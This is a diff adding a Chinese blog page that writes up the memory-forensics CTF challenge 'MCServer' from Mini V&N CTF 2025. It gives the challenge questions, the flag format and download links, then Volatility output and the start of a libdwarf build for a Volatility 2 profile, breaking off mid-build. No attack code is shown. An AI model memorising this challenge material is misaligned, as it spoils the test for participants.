@@ -1,0 +1,806 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="../../../../img/icon.png">
+  <link rel="icon" href="../../../../img/icon.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="tenstrings">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="MCServer题目描述n0o0b师傅在自己刚买的国产电脑上本地搭建了一个Minecraft服务器和wxm学姐等人进行游戏，可是不小心被蛤客zym获取到了shell，你能帮助n0o0b师傅找回珍藏的照片并帮助他寻找zym是如何入侵的吗？ Q1 蛤客zym在Minecraft游戏中的id是什么?Q2 请寻找蛤客zym进入了与Minecraft相关的什么程序?Q3 蛤客zym进入与Minecraft相">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Mini V&amp;N CTF 2025 Misc MCServer">
+<meta property="og:url" content="https://more678.github.io/2025/12/08/Mini%20V&N%20CTF%202025%20Misc%20MCServer/index.html">
+<meta property="og:site_name" content="tenstrings&#39;s blog">
+<meta property="og:description" content="MCServer题目描述n0o0b师傅在自己刚买的国产电脑上本地搭建了一个Minecraft服务器和wxm学姐等人进行游戏，可是不小心被蛤客zym获取到了shell，你能帮助n0o0b师傅找回珍藏的照片并帮助他寻找zym是如何入侵的吗？ Q1 蛤客zym在Minecraft游戏中的id是什么?Q2 请寻找蛤客zym进入了与Minecraft相关的什么程序?Q3 蛤客zym进入与Minecraft相">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://more678.github.io/img/archives/MiniVN2025/image-20251208192452899.png">
+<meta property="og:image" content="https://more678.github.io/img/archives/MiniVN2025/image-20251208192456438.png">
+<meta property="og:image" content="https://more678.github.io/img/archives/MiniVN2025/image-20251208192726724.png">
+<meta property="og:image" content="https://more678.github.io/img/archives/MiniVN2025/image-20251208202652978.png">
+<meta property="og:image" content="https://more678.github.io/img/archives/MiniVN2025/image-20251208203350749.png">
+<meta property="og:image" content="https://more678.github.io/img/archives/MiniVN2025/image-20251208203423726.png">
+<meta property="og:image" content="https://more678.github.io/img/archives/MiniVN2025/image-20251208203813636.png">
+<meta property="og:image" content="https://more678.github.io/img/archives/MiniVN2025/image-20251208204155973.png">
+<meta property="og:image" content="https://more678.github.io/img/archives/MiniVN2025/image-20251208211710082.png">
+<meta property="og:image" content="https://more678.github.io/img/archives/MiniVN2025/image-20251208211617365.png">
+<meta property="og:image" content="https://more678.github.io/img/archives/MiniVN2025/image-20251208223411422.png">
+<meta property="og:image" content="https://more678.github.io/img/archives/MiniVN2025/image-20251208223511354.png">
+<meta property="og:image" content="https://more678.github.io/img/archives/MiniVN2025/image-20251208223800149.png">
+<meta property="og:image" content="https://more678.github.io/img/archives/MiniVN2025/image-20251208223558999.png">
+<meta property="og:image" content="https://more678.github.io/img/archives/MiniVN2025/image-20251208224234033.png">
+<meta property="og:image" content="https://more678.github.io/img/archives/MiniVN2025/image-20251208224621859.png">
+<meta property="og:image" content="https://more678.github.io/img/archives/MiniVN2025/image-20251208225213712.png">
+<meta property="og:image" content="https://more678.github.io/img/archives/MiniVN2025/image-20251208225301014.png">
+<meta property="article:published_time" content="2025-12-08T15:00:00.000Z">
+<meta property="article:modified_time" content="2025-12-08T15:00:35.159Z">
+<meta property="article:author" content="tenstrings">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="Misc">
+<meta property="article:tag" content="出题">
+<meta property="article:tag" content="内存取证">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://more678.github.io/img/archives/MiniVN2025/image-20251208192452899.png">
+  
+  
+  
+  <title>Mini V&amp;N CTF 2025 Misc MCServer - tenstrings&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="../../../../css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="../../../../css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="../../../../css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"more678.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":false,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":"AkNKOtPwj7k90lMACLoaJ5ZK-gzGzoHsz","app_key":"e9kFad97QptN4ZXCtoS47NYc","server_url":"https://aknkotpw.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2020-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="../../../../js/utils.js" ></script>
+  <script  src="../../../../js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="../../../../index.html">
+      <strong>tenstrings&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="../../../../index.html" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="../../../../archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="../../../../categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="../../../../tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="../../../../about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="../../../../links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('../../../../img/image_1920_1080.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Mini V&amp;N CTF 2025 Misc MCServer"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        tenstrings
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-12-08 23:00" pubdate>
+          2025年12月8日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          6.4k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          36 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Mini V&amp;N CTF 2025 Misc MCServer</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="MCServer"><a href="#MCServer" class="headerlink" title="MCServer"></a>MCServer</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p>n0o0b师傅在自己刚买的国产电脑上本地搭建了一个Minecraft服务器和wxm学姐等人进行游戏，<br>可是不小心被蛤客zym获取到了shell，你能帮助n0o0b师傅找回珍藏的照片并帮助他寻找zym是如何入侵的吗？</p>
+<p>Q1 蛤客zym在Minecraft游戏中的id是什么?<br>Q2 请寻找蛤客zym进入了与Minecraft相关的什么程序?<br>Q3 蛤客zym进入与Minecraft相关的程序使用的用户名和密码是什么?<br>Q4 请从蛤客zym的入侵痕迹找出他通过上传了什么得到了shell?</p>
+<p>flag提交格式为<code>VNCTF&#123;Q1游戏ID_Q2程序名称_Q3用户名,Q3密码_Q4上传文件完整名称&#125;</code></p>
+<p>- 题目附件<br> - 百度网盘 <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1pCb1ycZizgnLvu08MaQ_Ng?pwd=XZ1T">mem.7z</a><br> - OneDrive <a target="_blank" rel="noopener" href="https://thecybersecuritygroup-my.sharepoint.com/:f:/g/personal/adminyy_thecybersecuritygroup_onmicrosoft_com/IgBKA3kAIRYkS7R8kpMwCx54AarwgotWr07ge598BvolFCA?e=BV3jJO">mem.7z</a><br> - 附件sha256值 100baa0b96f3bf1d8f8c7bd2a816d2b8fc457848f38a60d8e9772750fd3300e3</p>
+<h3 id="制作Vol2-Profile"><a href="#制作Vol2-Profile" class="headerlink" title="制作Vol2 Profile"></a>制作Vol2 Profile</h3><h4 id="获取Banner并找到对应系统版本"><a href="#获取Banner并找到对应系统版本" class="headerlink" title="获取Banner并找到对应系统版本"></a>获取Banner并找到对应系统版本</h4><p>先使用Volatility3查看banner</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs powershell">python3 vol.py <span class="hljs-operator">-f</span> mem.mem banners.Banners<br>Volatility <span class="hljs-number">3</span> Framework <span class="hljs-number">2.26</span>.<span class="hljs-number">0</span><br>Progress:  <span class="hljs-number">100.00</span>               PDB scanning finished<br>Offset  Banner<br><br><span class="hljs-number">0</span>x154c000c0     Linux version <span class="hljs-number">4.9</span>.<span class="hljs-number">0</span><span class="hljs-literal">-deepin13-amd64</span> (yangbo@deepin.com) (gcc version <span class="hljs-number">6.3</span>.<span class="hljs-number">0</span> <span class="hljs-number">20170321</span> (Debian <span class="hljs-number">6.3</span>.<span class="hljs-number">0</span><span class="hljs-literal">-11</span>) ) <span class="hljs-comment">#1 SMP PREEMPT Deepin 4.9.57-1 (2017-10-19) ()</span><br><span class="hljs-number">0</span>x1552a312c     Linux version <span class="hljs-number">4.9</span>.<span class="hljs-number">0</span><span class="hljs-literal">-deepin13-amd64</span> (yangbo@deepin.com) (gcc version <span class="hljs-number">6.3</span>.<span class="hljs-number">0</span> <span class="hljs-number">20170321</span> (Debian <span class="hljs-number">6.3</span>.<span class="hljs-number">0</span><span class="hljs-literal">-11</span>) ) <span class="hljs-comment">#1 SMP PREEMPT Deepin 4.9.57-1 (2017-10-19) ()</span><br><span class="hljs-number">0</span>x225c298b8     Linux version <span class="hljs-number">4.9</span>.<span class="hljs-number">0</span><span class="hljs-literal">-deepin13-amd64</span> (yangbo@deepin.com) (gcc version <span class="hljs-number">6.3</span>.<span class="hljs-number">0</span> <span class="hljs-number">20170321</span> (Debian <span class="hljs-number">6.3</span>.<span class="hljs-number">0</span><span class="hljs-literal">-11</span>) ) <span class="hljs-comment">#1 SMP PREEMPT Deepin 4.9.57-1 (2017-10-19) ()</span><br><span class="hljs-number">0</span>x23fef3a50     Linux version <span class="hljs-number">4.9</span>.<span class="hljs-number">0</span><span class="hljs-literal">-deepin13-amd64</span> (yangbo@deepin.com) (gcc version <span class="hljs-number">6.3</span>.<span class="hljs-number">0</span> <span class="hljs-number">20170321</span> (Debian <span class="hljs-number">6.3</span>.<span class="hljs-number">0</span><span class="hljs-literal">-11</span>) ) <span class="hljs-comment">#1 SMP PREEMPT Deepin 4.9.57-1 (2017-10-19) ()</span><br></code></pre></td></tr></table></figure>
+
+<p>发现是deepin系统，直接搜一下能找到内核对应的系统版本是15.5</p>
+<p><img src="../../../../img/archives/MiniVN2025/image-20251208192452899.png" srcset="/img/loading.gif" lazyload alt="image-20251208192452899"></p>
+<p><img src="../../../../img/archives/MiniVN2025/image-20251208192456438.png" srcset="/img/loading.gif" lazyload alt="image-20251208192456438"></p>
+<p>找到系统版本后，可以前往<a target="_blank" rel="noopener" href="https://sourceforge.net/projects/deepin/files/">SourceForge</a>或者<a target="_blank" rel="noopener" href="https://cdimage.deepin.com/releases-archive/">Deepin官方仓库</a>下载ISO文件安装系统</p>
+<p><img src="../../../../img/archives/MiniVN2025/image-20251208192726724.png" srcset="/img/loading.gif" lazyload alt="image-20251208192726724"></p>
+<p>安装系统就不说了，直接继续后面的步骤</p>
+<p>一个vol2的Profile需要&#x2F;boot&#x2F;System.map-xxx的静态符号表和编译得到的module.dwarf内核调试文件</p>
+<h4 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h4><p>从<a target="_blank" rel="noopener" href="https://www.prevanders.net/dwarf.html%E4%B8%8B%E8%BD%BD%E6%BA%90%E7%A0%81%E6%9E%84%E5%BB%BA%E5%AE%89%E8%A3%85dwarfdump%EF%BC%8C%E8%BF%99%E9%87%8C%E6%88%91%E9%80%89%E7%94%A8%E7%9A%84%E6%98%AF0.6.0%E7%89%88%E6%9C%AC">https://www.prevanders.net/dwarf.html下载源码构建安装dwarfdump，这里我选用的是0.6.0版本</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@test-PC:~# wget https://www.prevanders.net/libdwarf-0.6.0.tar.xz &amp;&amp; tar -xf libdwarf-0.6.0.tar.xz &amp;&amp; <span class="hljs-built_in">cd</span> libdwarf-0.6.0/ &amp;&amp; <span class="hljs-built_in">mkdir</span> build &amp;&amp; <span class="hljs-built_in">cd</span> build/ &amp;&amp; ../configure &amp;&amp; make -j16 &amp;&amp; make install &amp;&amp; sed -i <span class="hljs-string">&#x27;s/\/usr\/local\/bin\/dwarfdump/dwarfdump/g&#x27;</span> Makefile<br>--2025-12-08 20:05:47--  https://www.prevanders.net/libdwarf-0.6.0.tar.xz<br>正在解析主机 www.prevanders.net (www.prevanders.net)... 208.94.116.87<br>正在连接 www.prevanders.net (www.prevanders.net)|208.94.116.87|:443... 已连接。<br>已发出 HTTP 请求，正在等待回应... 200 OK<br>长度：2437352 (2.3M) [application/x-xz]<br>正在保存至: “libdwarf-0.6.0.tar.xz”<br><br>libdwarf-0.6.0.tar.xz                  100%[=========================================================================&gt;]   2.32M  6.81KB/s  用时 3m 17s  <br><br>2025-12-08 20:09:08 (12.1 KB/s) - 已保存 “libdwarf-0.6.0.tar.xz” [2437352/2437352])<br><br>checking build system <span class="hljs-built_in">type</span>... x86_64-pc-linux-gnu<br>checking host system <span class="hljs-built_in">type</span>... x86_64-pc-linux-gnu<br>checking <span class="hljs-keyword">for</span> gcc... gcc<br>checking whether the C compiler works... <span class="hljs-built_in">yes</span><br>checking <span class="hljs-keyword">for</span> C compiler default output file name... a.out<br>checking <span class="hljs-keyword">for</span> suffix of executables... <br>checking whether we are cross compiling... no<br>checking <span class="hljs-keyword">for</span> suffix of object files... o<br>checking whether the compiler supports 